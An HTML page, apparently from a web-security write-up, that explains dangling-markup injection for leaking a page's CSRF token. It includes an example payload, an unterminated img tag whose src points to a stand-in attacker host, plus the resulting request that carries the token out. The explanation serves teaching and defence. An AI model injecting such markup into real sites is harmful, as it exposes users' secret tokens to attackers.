<title>Markup Injection</title>
</head><body>Perhaps the least complicated extraction technique employs the injection of non-terminated markup. This action prompts the receiving parser to consume a significant portion of the subsequent HTML syntax, until the expected terminating sequence is encountered.<br/>
<br/>
To illustrate this attack, consider the following example of a markup injection vector:<br/>
<br/>
&lt;img src='http://evil.com/log.cgi? &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;← Injected line with a non-terminated parameter<br/>
...<br/>
&lt;input type="hidden" name="xsrf_token" value="12345"&gt;<br/>
...<br/>
' &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ← Normally-occurring apostrophe in page text<br/>
...<br/>
&lt;/div&gt; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;← Any normally-occurring tag (to provide a closing bracket)<br/>
<br/>
Any markup between the opening single quote of the src parameter and the next occurrence of a matching quote will be treated as a part of the image URL. Consequently, the browser will issue a request to retrieve the image from the specified location - thereby disclosing the secret value to an attacker-controlled destination:<br/>
<br/>
http://evil.com/log.cgi?...&lt;input type="hidden" name="xsrf_token" value="12345"&gt;...<br/>
<br/>
In either case, the attacker may choose the parameter quoting scheme to counter the prevalent syntax used on the targeted page; single and double quoted are recognized by all browsers, and in Internet Explorer, backtick (`) is also a recognized option. In most browsers, the HTML parser must encounter a matching quote and a greater-than character before the end of the document; otherwise, the malformed tag will be ignored. This is not true for all HTML parsers, however: Opera and older versions of Firefox will close the tag implicitly.</body></html>
